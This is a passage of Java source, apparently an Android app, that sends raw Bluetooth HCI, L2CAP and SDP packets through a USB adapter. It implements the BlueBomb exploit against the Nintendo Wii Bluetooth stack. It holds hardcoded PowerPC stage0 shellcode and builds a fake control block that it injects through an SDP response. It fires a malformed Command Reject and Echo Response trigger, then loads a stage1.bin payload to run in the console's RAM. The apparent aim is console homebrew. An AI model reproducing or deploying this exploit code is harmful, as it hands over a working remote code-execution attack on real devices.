            // L2CAP Information Request on signaling CID 0x0001.
            // Code=0x0A, Identifier=id, Length=2, InfoType=0x0002 (Extended Features Supported).
            byte[] signaling = new byte[]{0x0A, id, 0x02, 0x00, 0x02, 0x00};
            byte[] l2cap = new byte[4 + signaling.length];
            putLe16(l2cap, 0, signaling.length); // L2CAP length
            putLe16(l2cap, 2, 0x0001); // Signaling channel
            System.arraycopy(signaling, 0, l2cap, 4, signaling.length);

            boolean ok = sendAclPayload(activeConnectionHandle, l2cap, "L2CAP Information Request id=" + u8(id));
            if (ok) log("ACL OUT enviado. Aguarde possível ACL IN com Information Response.");
        });
    }

    private boolean sendAclPayload(int handle, byte[] payload, String label) {
        if (connection == null || aclOutEndpoint == null) {
            log("Não dá para enviar ACL: conexão/ACL OUT ausente.");
            return false;
        }
        if (payload.length > 0xFFFF) {
            log("Payload ACL grande demais: " + payload.length);
            return false;
        }
        byte[] packet = new byte[4 + payload.length];
        int handleFlags = (handle & 0x0FFF) | (0x02 << 12); // PB=0x02 start, BC=0.
        putLe16(packet, 0, handleFlags);
        putLe16(packet, 2, payload.length);
        System.arraycopy(payload, 0, packet, 4, payload.length);
        log("ACL OUT " + label + ": " + hex(packet, Math.min(packet.length, 128)) + (packet.length > 128 ? " ..." : ""));
        int written = connection.bulkTransfer(aclOutEndpoint, packet, packet.length, 2000);
        if (written < 0) {
            log("Falha no bulkTransfer ACL OUT.");
            return false;
        }
        if (written != packet.length) {
            log("AVISO: ACL OUT escreveu " + written + " de " + packet.length + " bytes.");
        }
        return written > 0;
    }

    private void processAclPacket(byte[] acl) {
        if (acl.length < 4) {
            log("ACL IN curto demais: len=" + acl.length);
            return;
        }
        int handleFlags = le16(acl, 0);
        int handle = handleFlags & 0x0FFF;
        int pb = (handleFlags >> 12) & 0x03;
        int bc = (handleFlags >> 14) & 0x03;
        int aclLen = le16(acl, 2);
        log(String.format(Locale.US,
                "  ACL parsed: handle=0x%04X pb=%d bc=%d aclLen=%d actualPayload=%d",
                handle, pb, bc, aclLen, Math.max(0, acl.length - 4)));

        if (acl.length >= 8) {
            int l2Len = le16(acl, 4);
            int cid = le16(acl, 6);
            int payloadStart = 8;
            int payloadEnd = Math.min(acl.length, 8 + l2Len);
            log(String.format(Locale.US, "  L2CAP: len=%d cid=0x%04X", l2Len, cid));
            if (cid == L2CAP_CID_SIGNALING) {
                parseL2capSignaling(acl, payloadStart, payloadEnd);
            } else if (cid == sdpLocalCid && sdpLocalCid >= 0) {
                processSdpPacket(acl, payloadStart, payloadEnd);
            } else if (cid == hidControlLocalCid && hidControlLocalCid >= 0) {
                log("  HID Control data: " + hex(Arrays.copyOfRange(acl, payloadStart, payloadEnd), Math.min(payloadEnd - payloadStart, 128)));
            } else if (cid == hidInterruptLocalCid && hidInterruptLocalCid >= 0) {
                log("  HID Interrupt data: " + hex(Arrays.copyOfRange(acl, payloadStart, payloadEnd), Math.min(payloadEnd - payloadStart, 128)));
            } else {
                log(String.format(Locale.US, "  L2CAP CID 0x%04X ainda sem handler v0.4.", cid));
            }
        }
    }

    private void parseL2capSignaling(byte[] data, int start, int end) {
        int off = start;
        while (off + 4 <= end) {
            int code = u8(data[off]);
            int ident = u8(data[off + 1]);
            int len = le16(data, off + 2);
            int payloadStart = off + 4;
            int payloadEnd = Math.min(end, payloadStart + len);
            log(String.format(Locale.US,
                    "  L2CAP SIG: code=0x%02X(%s) id=%d len=%d",
                    code, l2capSignalName(code), ident, len));

            if (payloadStart + len > end) {
                log("  L2CAP SIG truncado no pacote recebido.");
                return;
            }

            if (code == 0x02 && len >= 4) { // Connection Request
                int psm = le16(data, payloadStart);
                int scid = le16(data, payloadStart + 2);
                log(String.format(Locale.US, "    Connection Request: PSM=0x%04X SCID=0x%04X", psm, scid));
                handleL2capConnectionRequest(ident, psm, scid);
            } else if (code == 0x03 && len >= 8) { // Connection Response
                int dcid = le16(data, payloadStart);
                int scid = le16(data, payloadStart + 2);
                int result = le16(data, payloadStart + 4);
                int status = le16(data, payloadStart + 6);
                log(String.format(Locale.US, "    Connection Response: DCID=0x%04X SCID=0x%04X result=0x%04X status=0x%04X", dcid, scid, result, status));
                handlePossibleBlueBombStageResponse(result, dcid, scid, status);
            } else if (code == 0x04 && len >= 4) { // Configure Request
                int dcid = le16(data, payloadStart);
                int flags = le16(data, payloadStart + 2);
                log(String.format(Locale.US, "    Configure Request: DCID=0x%04X flags=0x%04X optionsLen=%d", dcid, flags, len - 4));
                sendL2capConfigureResponse(ident, dcid);
                if (dcid == sdpLocalCid && sdpLocalCid >= 0 && sdpRemoteCid >= 0) {
                    log("    v0.11: Configure Request remoto SDP respondido; aguardando Configure Response ou SDP real do Wii.");
                }
            } else if (code == 0x05 && len >= 6) { // Configure Response
                int scid = le16(data, payloadStart);
                int flags = le16(data, payloadStart + 2);
                int result = le16(data, payloadStart + 4);
                log(String.format(Locale.US, "    Configure Response: SCID=0x%04X flags=0x%04X result=0x%04X optionsLen=%d", scid, flags, result, len - 6));
                if (result == 0x0000 && sdpLocalCid >= 0 && sdpRemoteCid >= 0) {
                    sdpConfigSeen = true;
                    scheduleProactiveSdpProbe("apos Configure Response success / socket L2CAP equivalente", sdpStartDelayMs);
                }
            } else if (code == 0x06 && len >= 4) { // Disconnection Request
                int dcid = le16(data, payloadStart);
                int scid = le16(data, payloadStart + 2);
                log(String.format(Locale.US, "    Disconnection Request: DCID=0x%04X SCID=0x%04X", dcid, scid));
                byte[] resp = new byte[4];
                putLe16(resp, 0, dcid);
                putLe16(resp, 2, scid);
                sendL2capSignaling(0x07, ident, resp, "Disconnection Response");
            } else if (code == 0x08) { // Echo Request
                int n = Math.max(0, len);
                byte[] payload = Arrays.copyOfRange(data, payloadStart, payloadStart + n);
                sendL2capSignaling(0x09, ident, payload, "Echo Response");
            } else if (code == 0x0A && len >= 2) { // Information Request
                int infoType = le16(data, payloadStart);
                log(String.format(Locale.US, "    Information Request: type=0x%04X", infoType));
                sendL2capInformationResponse(ident, infoType);
            } else if (code == 0x0B && len >= 4) { // Information Response
                int infoType = le16(data, payloadStart);
                int result = le16(data, payloadStart + 2);
                log(String.format(Locale.US, "    Information Response: type=0x%04X result=0x%04X dataLen=%d", infoType, result, len - 4));
            }

            off = payloadEnd;
        }
    }

    private void handleL2capConnectionRequest(int ident, int psm, int remoteScid) {
        int localDcid;
        if (psm == L2CAP_PSM_SDP) {
            localDcid = LOCAL_CID_SDP;
            sdpLocalCid = localDcid;
            sdpRemoteCid = remoteScid;
            sdpConfigSeen = false;
            sdpProactiveSent = false;
            bluebombSdpFlowStarted = false;
            log(String.format(Locale.US, "    Auto L2CAP: aceitando SDP. localDCID=0x%04X remoteSCID=0x%04X", localDcid, remoteScid));
            log("    v0.11: SDP local CID=0x0040 e respostas SDP reais redirecionadas para Stage0.");
        } else if (psm == L2CAP_PSM_HID_CONTROL) {
            localDcid = LOCAL_CID_HID_CONTROL;
            hidControlLocalCid = localDcid;
            hidControlRemoteCid = remoteScid;
            log(String.format(Locale.US, "    Auto L2CAP: aceitando HID Control. localDCID=0x%04X remoteSCID=0x%04X", localDcid, remoteScid));
        } else if (psm == L2CAP_PSM_HID_INTERRUPT) {
            localDcid = LOCAL_CID_HID_INTERRUPT;
            hidInterruptLocalCid = localDcid;
            hidInterruptRemoteCid = remoteScid;
            log(String.format(Locale.US, "    Auto L2CAP: aceitando HID Interrupt. localDCID=0x%04X remoteSCID=0x%04X", localDcid, remoteScid));
        } else {
            log(String.format(Locale.US, "    Auto L2CAP: PSM 0x%04X ainda não suportado; respondendo PSM not supported.", psm));
            sendL2capConnectionResponse(ident, 0x0000, remoteScid, 0x0002, 0x0000);
            return;
        }
        sendL2capConnectionResponse(ident, localDcid, remoteScid, 0x0000, 0x0000);
        sendL2capConfigureRequest(remoteScid);
    }

    private void sendL2capConnectionResponse(int ident, int dcid, int scid, int result, int status) {
        byte[] payload = new byte[8];
        putLe16(payload, 0, dcid);
        putLe16(payload, 2, scid);
        putLe16(payload, 4, result);
        putLe16(payload, 6, status);
        sendL2capSignaling(0x03, ident, payload,
                String.format(Locale.US, "Connection Response DCID=0x%04X SCID=0x%04X result=0x%04X", dcid, scid, result));
    }

    private void sendL2capConfigureRequest(int remoteCid) {
        byte[] payload = new byte[4];
        putLe16(payload, 0, remoteCid);
        putLe16(payload, 2, 0x0000);
        int id = nextL2capId();
        sendL2capSignaling(0x04, id, payload, String.format(Locale.US, "Configure Request DCID(remote)=0x%04X", remoteCid));
    }

    private void sendL2capConfigureResponse(int ident, int cid) {
        byte[] payload = new byte[6];
        putLe16(payload, 0, cid);
        putLe16(payload, 2, 0x0000); // flags
        putLe16(payload, 4, 0x0000); // success
        sendL2capSignaling(0x05, ident, payload, String.format(Locale.US, "Configure Response CID=0x%04X success", cid));
    }

    private void sendL2capInformationResponse(int ident, int infoType) {
        byte[] payload;
        if (infoType == 0x0002) { // Extended Features Supported
            payload = new byte[8];
            putLe16(payload, 0, infoType);
            putLe16(payload, 2, 0x0000); // success
            // Features = 0 for now. Basic mode only.
            putLe16(payload, 4, 0x0000);
            putLe16(payload, 6, 0x0000);
        } else if (infoType == 0x0003) { // Fixed Channels Supported
            payload = new byte[12];
            putLe16(payload, 0, infoType);
            putLe16(payload, 2, 0x0000); // success
            payload[4] = 0x02; // signaling channel bit, conservative
        } else {
            payload = new byte[4];
            putLe16(payload, 0, infoType);
            putLe16(payload, 2, 0x0001); // not supported
        }
        sendL2capSignaling(0x0B, ident, payload, String.format(Locale.US, "Information Response type=0x%04X", infoType));
    }

    private void sendL2capSignaling(int code, int ident, byte[] payload, String label) {
        byte[] signaling = new byte[4 + payload.length];
        signaling[0] = (byte) (code & 0xFF);
        signaling[1] = (byte) (ident & 0xFF);
        putLe16(signaling, 2, payload.length);
        System.arraycopy(payload, 0, signaling, 4, payload.length);
        sendL2capData(L2CAP_CID_SIGNALING, signaling, "L2CAP SIG " + label);
    }

    private void sendL2capData(int cid, byte[] payload, String label) {
        if (activeConnectionHandle < 0) {
            log("Não dá para enviar L2CAP " + label + ": sem conexão HCI ativa.");
            return;
        }
        byte[] l2cap = new byte[4 + payload.length];
        putLe16(l2cap, 0, payload.length);
        putLe16(l2cap, 2, cid);
        System.arraycopy(payload, 0, l2cap, 4, payload.length);
        sendAclPayload(activeConnectionHandle, l2cap, label);
    }

    private int nextL2capId() {
        synchronized (this) {
            int id = nextL2capIdentifier & 0xFF;
            nextL2capIdentifier++;
            if (nextL2capIdentifier > 250) nextL2capIdentifier = 1;
            if (id == 0) id = 1;
            return id;
        }
    }


    private void scheduleProactiveSdpProbe(String reason, long delayMs) {
        if (bluebombSdpFlowStarted) {
            log("  SDP proativo não agendado: fluxo SDP real do Wii já iniciou. Motivo: " + reason);
            return;
        }
        if (sdpProactiveSent) {
            log("  SDP proativo já foi agendado/enviado; ignorando novo gatilho: " + reason);
            return;
        }
        if (activeConnectionHandle < 0 || sdpRemoteCid < 0) {
            log("  SDP proativo não agendado: sem conexão/canal SDP. Motivo: " + reason);
            return;
        }
        sdpProactiveSent = true;
        log("  SDP proativo agendado (" + reason + ") em " + delayMs + "ms.");
        new Thread(() -> {
            try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
            sendProactiveSdpProbe(reason);
        }, "sdp-proactive-probe").start();
    }

    private void sendProactiveSdpProbe(String reason) {
        if (bluebombSdpFlowStarted) {
            log("  SDP proativo cancelado: fluxo SDP real do Wii já iniciou. Motivo: " + reason);
            return;
        }
        if (activeConnectionHandle < 0 || sdpRemoteCid < 0) {
            log("  SDP proativo cancelado: conexão/canal SDP sumiu. Motivo: " + reason);
            return;
        }
        log("===== SDP v0.19 / BLUEBOMB STAGE0 REAL =====");
        log(String.format(Locale.US,
                "BlueBomb Stage0 preset: %s L2CB=0x%08X payload_addr=0x%08X modeCont=" + (stage0StrictContinuation ? "STRICT" : "AUTO") + ".",
                selectedStage0AssetName, selectedBlueBombL2cb, selectedStage0PayloadAddr));
        sendSdpServiceSearchResponseBlueBombExact(0x0001, selectedBlueBombL2cb);
        try { Thread.sleep(450); } catch (InterruptedException ignored) {}
        sendSdpServiceAttributeResponseStage0First(0x0001);
        // Fallback: no BlueBomb original ele espera um recv() antes da continuação. Como estamos em raw ACL,
        // se o Wii não mandar PDU visível, tentamos enviar a continuação depois de um pequeno atraso.
        scheduleStage0RemainderFallback(0x0001, 950);
    }

    private static final byte[] BLUEBOMB_STAGE0_ORIG = new byte[]{
            (byte)0x7D, (byte)0x68, (byte)0x02, (byte)0xA6, (byte)0x48, (byte)0x00, (byte)0x00, (byte)0x0D, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
            (byte)0x60, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x7D, (byte)0x48, (byte)0x02, (byte)0xA6, (byte)0x39, (byte)0x4A, (byte)0xFF, (byte)0xF8,
            (byte)0x7D, (byte)0x44, (byte)0x53, (byte)0x78, (byte)0x3C, (byte)0x60, (byte)0x80, (byte)0x00, (byte)0x60, (byte)0x63, (byte)0x18, (byte)0x00,
            (byte)0x3C, (byte)0xA0, (byte)0x00, (byte)0x00, (byte)0x60, (byte)0xA5, (byte)0x01, (byte)0x30, (byte)0x48, (byte)0x00, (byte)0x00, (byte)0xDD,
            (byte)0x3C, (byte)0x80, (byte)0x00, (byte)0x00, (byte)0x60, (byte)0x84, (byte)0x01, (byte)0x30, (byte)0x48, (byte)0x00, (byte)0x00, (byte)0x9D,
            (byte)0x3C, (byte)0x60, (byte)0x80, (byte)0x00, (byte)0x60, (byte)0x63, (byte)0x18, (byte)0x08, (byte)0x3C, (byte)0x80, (byte)0x80, (byte)0x00,
            (byte)0x60, (byte)0x84, (byte)0x19, (byte)0x2C, (byte)0x80, (byte)0xA3, (byte)0x00, (byte)0x00, (byte)0x90, (byte)0xA4, (byte)0x00, (byte)0x00,
            (byte)0x38, (byte)0xC0, (byte)0x53, (byte)0x30, (byte)0x48, (byte)0x00, (byte)0x00, (byte)0x54, (byte)0x3C, (byte)0x60, (byte)0x80, (byte)0x00,
            (byte)0x60, (byte)0x63, (byte)0x18, (byte)0x08, (byte)0x80, (byte)0x63, (byte)0x00, (byte)0x00, (byte)0x7C, (byte)0x69, (byte)0x03, (byte)0xA6,
            (byte)0x4E, (byte)0x80, (byte)0x04, (byte)0x20, (byte)0x7D, (byte)0x68, (byte)0x02, (byte)0xA6, (byte)0x2C, (byte)0x19, (byte)0x00, (byte)0x01,
            (byte)0x41, (byte)0x82, (byte)0xFF, (byte)0xE4, (byte)0x3C, (byte)0x60, (byte)0x80, (byte)0x00, (byte)0x60, (byte)0x63, (byte)0x19, (byte)0x2C,
            (byte)0x80, (byte)0x83, (byte)0x00, (byte)0x00, (byte)0x7C, (byte)0x04, (byte)0x8A, (byte)0x14, (byte)0x90, (byte)0x03, (byte)0x00, (byte)0x00,
            (byte)0x7C, (byte)0x83, (byte)0x23, (byte)0x78, (byte)0x38, (byte)0x90, (byte)0x00, (byte)0x04, (byte)0x7E, (byte)0x25, (byte)0x8B, (byte)0x78,
            (byte)0x48, (byte)0x00, (byte)0x00, (byte)0x6D, (byte)0x7E, (byte)0x24, (byte)0x8B, (byte)0x78, (byte)0x48, (byte)0x00, (byte)0x00, (byte)0x31,
            (byte)0x38, (byte)0xC0, (byte)0x47, (byte)0x44, (byte)0x38, (byte)0x6F, (byte)0x00, (byte)0x54, (byte)0x3C, (byte)0x80, (byte)0x80, (byte)0x00,
            (byte)0x60, (byte)0x84, (byte)0x18, (byte)0x70, (byte)0x90, (byte)0x83, (byte)0x00, (byte)0x00, (byte)0x7D, (byte)0xE3, (byte)0x7B, (byte)0x78,
            (byte)0x38, (byte)0x80, (byte)0x00, (byte)0x00, (byte)0x38, (byte)0xA0, (byte)0x00, (byte)0x00, (byte)0x39, (byte)0x6B, (byte)0xF8, (byte)0x54,
            (byte)0x7D, (byte)0x68, (byte)0x03, (byte)0xA6, (byte)0x4E, (byte)0x80, (byte)0x00, (byte)0x20, (byte)0x38, (byte)0xA0, (byte)0x00, (byte)0x1F,
            (byte)0x54, (byte)0x63, (byte)0x00, (byte)0x34, (byte)0x7C, (byte)0x84, (byte)0x2A, (byte)0x14, (byte)0x54, (byte)0x84, (byte)0xD9, (byte)0x7E,
            (byte)0x7C, (byte)0x89, (byte)0x03, (byte)0xA6, (byte)0x7C, (byte)0x00, (byte)0x18, (byte)0x6C, (byte)0x7C, (byte)0x00, (byte)0x04, (byte)0xAC,
            (byte)0x7C, (byte)0x00, (byte)0x1F, (byte)0xAC, (byte)0x38, (byte)0x63, (byte)0x00, (byte)0x20, (byte)0x42, (byte)0x00, (byte)0xFF, (byte)0xF0,
            (byte)0x7C, (byte)0x00, (byte)0x04, (byte)0xAC, (byte)0x4C, (byte)0x00, (byte)0x01, (byte)0x2C, (byte)0x4E, (byte)0x80, (byte)0x00, (byte)0x20,
            (byte)0x7C, (byte)0x66, (byte)0x1B, (byte)0x78, (byte)0x7C, (byte)0xA9, (byte)0x03, (byte)0xA6, (byte)0x38, (byte)0x63, (byte)0xFF, (byte)0xFF,
            (byte)0x38, (byte)0x84, (byte)0xFF, (byte)0xFF, (byte)0x8C, (byte)0x04, (byte)0x00, (byte)0x01, (byte)0x9C, (byte)0x03, (byte)0x00, (byte)0x01,
            (byte)0x42, (byte)0x00, (byte)0xFF, (byte)0xF8, (byte)0x7C, (byte)0xC3, (byte)0x33, (byte)0x78, (byte)0x4E, (byte)0x80, (byte)0x00, (byte)0x20,
            (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00
    };

    private byte[] buildPatchedStage0() {
        byte[] stage0 = Arrays.copyOf(BLUEBOMB_STAGE0_ORIG, BLUEBOMB_STAGE0_ORIG.length);
        // BlueBomb original: if L2CB >= 0x81000000, payload_addr = 0x80004000; otherwise 0x81780000.
        putBe32(stage0, 0x08, selectedStage0PayloadAddr);
        return stage0;
    }

    private void sendSdpServiceSearchResponseBlueBombExact(int txid, int l2cb) {
        int sdpCb = l2cb + 0x0C00;
        byte[] params = new byte[2 + 2 + (0x15 * 4) + 1];
        putBe16(params, 0, 0x0015);
        putBe16(params, 2, 0x0015);
        int handlesOff = 4;
        // BlueBomb original deixa a lista de handles zerada e injeta apenas o fake CCB no 11º handle.
        // A v0.5/v0.6 preenchia handles sintéticos; v0.6b remove isso para ficar mais fiel.

        byte[] fakeCcb = buildBlueBombFakeCcb(l2cb, sdpCb);
        System.arraycopy(fakeCcb, 0, params, handlesOff + (0x0A * 4), fakeCcb.length);
        params[params.length - 1] = 0x00;

        log(String.format(Locale.US,
                "  BlueBomb fake CCB: L2CB=0x%08X SDP_CB=0x%08X bytes=%s",
                l2cb, sdpCb, hex(fakeCcb, fakeCcb.length)));
        sendSdpPdu(0x03, txid, params, "PROATIVO BlueBomb-exact ServiceSearchResponse com fake CCB");
    }

    private byte[] buildBlueBombFakeCcb(int l2cb, int sdpCb) {
        byte[] ccb = new byte[24];
        ccb[0] = 0x01;
        putBe32(ccb, 4, 0x00000002);
        putBe32(ccb, 8, sdpCb + 0x68);
        putBe32(ccb, 12, l2cb + 0x54);
        putBe32(ccb, 16, l2cb + 0x08);
        putBe16(ccb, 20, 0x0000);
        putBe16(ccb, 22, 0x0000);
        return ccb;
    }

    private void sendSdpServiceAttributeResponseStage0First(int txid) {
        final int SDP_MTU = 0xD0;
        byte[] stage0 = buildPatchedStage0();
        int firstLen = Math.min(SDP_MTU, stage0.length);

        byte[] attrList = new byte[1 + 1 + 1 + 2 + 1 + firstLen];
        int p = 0;
        attrList[p++] = 0x35;
        attrList[p++] = 0x02;
        attrList[p++] = 0x09;
        attrList[p++] = (byte) 0xBE;
        attrList[p++] = (byte) 0xEF;
        attrList[p++] = 0x00;
        System.arraycopy(stage0, 0, attrList, p, firstLen);

        byte[] params = new byte[2 + attrList.length + 1];
        putBe16(params, 0, attrList.length);
        System.arraycopy(attrList, 0, params, 2, attrList.length);
        // BlueBomb original: ContinuationState = 1 se ainda há stage0 restante.
        params[params.length - 1] = (byte) (stage0.length > SDP_MTU ? 0x01 : 0x00);

        stage0FirstSent = true;
        stage0RemainderSent = stage0.length <= SDP_MTU;
        log(String.format(Locale.US,
                "  Stage0 real: total=%d first=%d rem=%d payload_addr=0x%08X cont=%d",
                stage0.length, firstLen, Math.max(0, stage0.length - firstLen), selectedStage0PayloadAddr, u8(params[params.length - 1])));
        sendSdpPdu(0x05, txid, params, "PROATIVO BlueBomb stage0 real parte 1");
        if (stage0RemainderSent) {
            scheduleBlueBombHaxTrigger("stage0 coube em uma parte", stage0HaxDelayMs);
        }
    }

    private void scheduleStage0RemainderFallback(int txid, long delayMs) {
        if (stage0StrictContinuation) {
            log("  STRICT: continuação stage0 NÃO será enviada por fallback. Aguardando SDP PDU/continuation real do Wii.");
            return;
        }
        new Thread(() -> {
            try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
            if (activeConnectionHandle < 0 || sdpRemoteCid < 0) return;
            if (stage0FirstSent && !stage0RemainderSent) {
                log("  AUTO: nenhum SDP continuation visível; enviando continuação stage0 real por fallback.");
                sendBlueBombStage0Remainder(txid);
                scheduleBlueBombHaxTrigger("apos fallback AUTO de continuacao stage0", stage0HaxDelayMs);
            }
        }, "stage0-rem-fallback").start();
    }

    private void sendBlueBombStage0Remainder(int txid) {
        if (stage0RemainderSent) {
            log("  Stage0 restante já enviado; ignorando duplicado.");
            return;
        }
        final int SDP_MTU = 0xD0;
        byte[] stage0 = buildPatchedStage0();
        if (stage0.length <= SDP_MTU) {
            stage0RemainderSent = true;
            return;
        }
        int rem = stage0.length - SDP_MTU;
        int chunk = Math.min(SDP_MTU, rem);

        if (stage0PaddedContinuation) {
            // Comparativo v0.8: pacote real também tem ParameterLength=0x00D3.
            byte[] params = new byte[2 + SDP_MTU + 1];
            putBe16(params, 0, SDP_MTU);
            System.arraycopy(stage0, SDP_MTU, params, 2, chunk);
            params[params.length - 1] = (byte) (rem > SDP_MTU ? 0x01 : 0x00);
            stage0RemainderSent = rem <= SDP_MTU;
            log(String.format(Locale.US,
                    "  Stage0 continuação PADDED-COMPARE: off=0x%X chunkReal=%d paddedTo=%d attrLen=0x%04X paramLen=0x%04X restAfter=%d cont=%d",
                    SDP_MTU, chunk, SDP_MTU, SDP_MTU, params.length, Math.max(0, rem - chunk), u8(params[params.length - 1])));
            sendSdpPdu(0x05, txid, params, "PROATIVO BlueBomb stage0 continuacao PADDED-COMPARE");
            return;
        }

        // BYTE-PARITY com BlueBomb original:
        // send_sdp_attribute_response() declara ParameterLength = 2 + SDP_MTU + 1 (0x00D3)
        // e AttributeListByteCount = SDP_MTU (0x00D0), mas escreve só o restante real do
        // stage0 (96 bytes no 4.3U) + ContinuationState. Isso parece estranho, mas é o
        // comportamento exato do bluebomb.c; não preencher com zeros aqui.
        byte[] params = new byte[2 + chunk + 1];
        putBe16(params, 0, SDP_MTU);
        System.arraycopy(stage0, SDP_MTU, params, 2, chunk);
        params[params.length - 1] = (byte) (rem > SDP_MTU ? 0x01 : 0x00);
        stage0RemainderSent = rem <= SDP_MTU;
        int declaredParamLen = 2 + SDP_MTU + 1;
        log(String.format(Locale.US,
                "  Stage0 continuação BLUEBOMB-ORIG-TRUNC: off=0x%X chunkReal=%d attrLen=0x%04X actualParamLen=%d declaredParamLen=%d restAfter=%d cont=%d",
                SDP_MTU, chunk, SDP_MTU, params.length, declaredParamLen, Math.max(0, rem - chunk), u8(params[params.length - 1])));
        sendSdpPduDeclaredLength(0x05, txid, params, declaredParamLen, "PROATIVO BlueBomb stage0 continuacao BYTE-PARITY-ORIG-TRUNC");
    }

    private void scheduleBlueBombHaxTrigger(String reason, long delayMs) {
        if (haxScheduled || haxTriggered) {
            log("  Hax trigger já agendado/enviado; ignorando: " + reason);
            return;
        }
        haxScheduled = true;
        log("  Hax trigger BlueBomb será enviado em " + delayMs + "ms. Motivo: " + reason);
        new Thread(() -> {
            try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
            sendBlueBombHaxTrigger(reason);
        }, "bluebomb-hax-trigger").start();
    }

    private void sendBlueBombHaxTrigger(String reason) {
        if (activeConnectionHandle < 0) {
            log("===== BLUEBOMB HAX TRIGGER cancelado: sem conexão HCI. Motivo: " + reason + " =====");
            return;
        }
        haxTriggered = true;
        log("===== BLUEBOMB HAX TRIGGER v0.6 =====");
        log("Enviando cadeia L2CAP equivalente ao do_hax(): Command Reject inválido + Echo Response. Aguardando possível S0.");
        byte[] cmds = new byte[14];
        int p = 0;
        cmds[p++] = 0x01; // L2CAP_CMD_REJECT
        cmds[p++] = 0x00;
        putLe16(cmds, p, 0x0006); p += 2;
        putLe16(cmds, p, 0x0002); p += 2; // invalid CID
        putLe16(cmds, p, 0x0000); p += 2; // rcid from faked ccb
        putLe16(cmds, p, 0x0040 + 0x1F); p += 2; // lcid
        cmds[p++] = 0x09; // L2CAP_CMD_ECHO_RSP triggers callback
        cmds[p++] = 0x00;
        putLe16(cmds, p, 0x0000); p += 2;
        sendL2capData(L2CAP_CID_SIGNALING, cmds, "BLUEBOMB do_hax cmd_reject_plus_echo_rsp");
        log("Se stage0 rodar, procure por Connection Response result=0x5330 ('S0') no log.");
    }

    private void handlePossibleBlueBombStageResponse(int result, int dcid, int scid, int status) {
        if (result == 0x5330) {
            stage0ResponseSeen = true;
            log("===== STAGE0 RESPONDEU: result=0x5330 ('S0') =====");
            log("Isso confirma que o stage0 executou. v0.17 now starts Stage1 externo/fallback benigno com jump controlado.");
            if (stage1UploadEnabled && !stage1UploadStarted) {
                startStage1DiagnosticUpload();
            } else if (!stage1UploadEnabled) {
                log("Stage1 upload desativado nesta build.");
            }
        } else if (result == 0x4744) {
            synchronized (stage1AckLock) {
                stage1AckCount++;
                stage1AckLock.notifyAll();
            }
            log(String.format(Locale.US, "===== STAGE0/STAGE1 ACK: result=0x4744 ('GD') ackCount=%d =====", stage1AckCount));
        }
    }

    private File getStage1ExternalFile() {
        File dir = getExternalFilesDir(null);
        return dir == null ? null : new File(dir, "stage1.bin");
    }

    private void logStage1ExternalStatus() {
        File external = getStage1ExternalFile();
        if (external == null) {
            log("stage1.bin: diretório app-specific indisponível no momento.");
            return;
        }
        log("stage1.bin esperado em: " + external.getAbsolutePath());
        if (external.isFile()) {
            log(String.format(Locale.US, "stage1.bin externo encontrado: size=%d bytes", external.length()));
        } else {
            log("stage1.bin externo não encontrado. Pelo Windows use: adb push stage1.bin " + external.getAbsolutePath());
        }
        byte[] asset = loadAssetStage1Payload(false);
        if (asset != null) {
            log(String.format(Locale.US, "stage1.bin embutido no APK disponível: size=%d bytes", asset.length));
        }
    }

    private byte[] readAllBytesFromStream(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) >= 0) {
            if (n > 0) out.write(buf, 0, n);
        }
        return out.toByteArray();
    }

    private byte[] loadAssetStage1Payload(boolean required) {
        try (InputStream in = getAssets().open("stage1.bin")) {
            byte[] data = readAllBytesFromStream(in);
            if (data.length <= 0) {
                log(required ? "ERRO: assets/stage1.bin existe, mas está vazio. Abortando." : "assets/stage1.bin vazio. Ignorando.");
                return null;
            }
            if (data.length > (1024 * 1024)) {
                log(required ? "ERRO: assets/stage1.bin maior que 1 MiB. Abortando por segurança." : "assets/stage1.bin maior que 1 MiB. Ignorando por segurança.");
                return null;
            }
            log(String.format(Locale.US, "===== STAGE1 ASSET v0.17 CARREGADO: assets/stage1.bin size=%d bytes =====", data.length));
            log("ATENÇÃO: stage1.bin embutido será executado em RAM após GD/JUMP. Use somente arquivo confiável e adequado ao Wii.");
            return data;
        } catch (Exception e) {
            log(required ? "ERRO: assets/stage1.bin obrigatório não pôde ser carregado: " + e.getMessage() : "assets/stage1.bin não disponível: " + e.getMessage());
            return null;
        }
    }

    private byte[] buildDiagnosticStage1Payload() {
        // v0.16: mantém fallback benigno, stage1 externo e adiciona stage1 embutido em assets.
        // O payload real só é carregado após S0/GD, bem depois da fase de descoberta/conexão.
        if (requireAssetStage1) {
            byte[] asset = loadAssetStage1Payload(true);
            if (asset == null) return null;
            return asset;
        }
        try {
            File external = getStage1ExternalFile();
            if (external != null) {
                log("v0.16: procurando stage1 externo em: " + external.getAbsolutePath());
                if (external.isFile()) {
                    long size = external.length();
                    if (size <= 0) {
                        if (requireExternalStage1) { log("ERRO: stage1.bin obrigatório existe, mas está vazio. Abortando."); return null; }
                        log("v0.16: stage1.bin existe, mas está vazio. Usando fallback benigno.");
                    } else if (size > (1024 * 1024)) {
                        if (requireExternalStage1) { log("ERRO: stage1.bin obrigatório maior que 1 MiB. Abortando por segurança."); return null; }
                        log("v0.16: stage1.bin maior que 1 MiB. Por segurança, não vou usar. Usando fallback benigno.");
                    } else {
                        byte[] data = new byte[(int) size];
                        try (FileInputStream in = new FileInputStream(external)) {
                            int off = 0;
                            while (off < data.length) {
                                int n = in.read(data, off, data.length - off);
                                if (n < 0) break;
                                off += n;
                            }
                            if (off == data.length) {
                                log(String.format(Locale.US,
                                        "===== STAGE1 EXTERNO v0.16 CARREGADO: %s size=%d bytes =====",
                                        external.getAbsolutePath(), data.length));
                                log("ATENÇÃO: stage1.bin externo será executado em RAM após GD/JUMP. Use somente arquivo confiável e adequado ao Wii.");
                                return data;
                            }
                            if (requireExternalStage1) { log("ERRO: leitura incompleta do stage1.bin obrigatório. Abortando."); return null; }
                            log("v0.16: leitura incompleta do stage1.bin. Usando fallback benigno.");
                        }
                    }
                } else {
                    if (requireExternalStage1) {
                        log("ERRO: stage1.bin externo obrigatório não encontrado. Abortando antes do fallback.");
                        return null;
                    }
                    log("v0.16: stage1.bin externo não encontrado. Usando fallback benigno da v0.13.");
                }
            } else {
